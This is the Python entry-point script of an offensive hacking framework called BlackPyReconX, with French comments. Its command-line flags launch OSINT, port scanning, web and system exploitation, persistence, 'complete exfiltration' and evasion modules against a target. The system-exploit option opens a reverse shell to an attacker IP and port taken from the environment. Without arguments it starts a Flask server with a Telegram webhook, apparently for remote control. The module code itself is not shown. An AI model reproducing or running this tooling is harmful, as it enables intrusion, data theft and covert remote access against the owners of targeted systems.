import argparse
import os
import sys
from dotenv import load_dotenv
from pathlib import Path

# Chargement des variables d’environnement depuis .env
load_dotenv()

# 📁 Ajout du chemin racine pour les imports locaux
BASE_DIR = Path(__file__).resolve().parent
sys.path.append(str(BASE_DIR))

# Importation des modules BlackPyReconX
from modules import (
    osint,
    scanner,
    exploit_web,
    exploit_sys,
    persistence,
    exfiltration,
    evasion,
    reporting
)

def run_cli():
    parser = argparse.ArgumentParser(
        description="🕷️ BlackPyReconX – Red Team Offensive Framework (Windows, Android, Unix)"
    )
    parser.add_argument("--target", help="🎯 Cible IP/Domaine", required=True)
    parser.add_argument("--osint", help="📡 Lancer OSINT", action="store_true")
    parser.add_argument("--scan", help="🧪 Scanner de ports", action="store_true")
    parser.add_argument("--web", help="💉 Exploitation Web", action="store_true")
    parser.add_argument("--exploit_sys", help="🎮 Exploitation Système", action="store_true")
    parser.add_argument("--persist", help="🛠️ Persistance", action="store_true")
    parser.add_argument("--exfil", help="📤 Exfiltration complète", action="store_true")
    parser.add_argument("--evasion", help="🕶️ Techniques d’évasion", action="store_true")
    parser.add_argument("--report", help="📝 Générer le rapport final", action="store_true")

    args = parser.parse_args()

    if args.osint:
        osint.run(args.target)

    if args.scan:
        scanner.run(args.target)

    if args.web:
        exploit_web.run(args.target)

    if args.exploit_sys:
        attacker_ip = os.getenv("ATTACKER_IP", "127.0.0.1")
        attacker_port = int(os.getenv("ATTACKER_PORT", "4444"))
        exploit_sys.reverse_shell(attacker_ip, attacker_port)

    if args.persist:
        persistence.run(args.target)

    if args.evasion:
        evasion.run()

    if args.exfil:
        exfiltration.full_exfiltration()

    if args.report:
        reporting.generate_report()

def run_server():
    from flask import Flask
    from telegram_bot import webhook  # ✅ Import corrigé depuis ton dossier personnel

    app = Flask(__name__)
    app.register_blueprint(webhook.telegram_webhook, url_prefix="/telegram")

    @app.route("/")
    def index():
        return "🕷️ BlackPyReconX Webhook API est en ligne."

    port = int(os.getenv("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_cli()
    else:
        run_server()
